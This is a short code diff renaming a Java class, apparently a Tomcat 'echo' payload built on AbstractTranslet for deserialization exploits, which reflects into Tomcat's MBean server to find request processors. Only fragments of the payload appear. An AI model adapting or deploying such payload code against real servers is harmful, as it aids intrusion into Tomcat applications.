@@ -12,7 +12,7 @@ import java.lang.reflect.Field;
 import java.util.ArrayList;
 import java.util.HashMap;
 
-public class TomcatTmplEcho extends AbstractTranslet {
+public class TomcatCoyoteRequestEcho extends AbstractTranslet {
     public Object getMBeanDomainTb() throws Exception {
         javax.management.MBeanServer mBeanServer = org.apache.tomcat.util.modeler.Registry.getRegistry(null, null).getMBeanServer();
         Object mbsInterceptor = getFV(mBeanServer, "mbsInterceptor");
@@ -68,7 +68,7 @@ public class TomcatTmplEcho extends AbstractTranslet {
         return null;
     }
 
-    public TomcatTmplEcho() throws Exception {
+    public TomcatCoyoteRequestEcho() throws Exception {
         ArrayList processors = (ArrayList) getMBeanProcessors();
         processors = processors != null ? processors : (ArrayList) getThreadProcessors();
         for (int i = 0; i < processors.size(); ++i) {
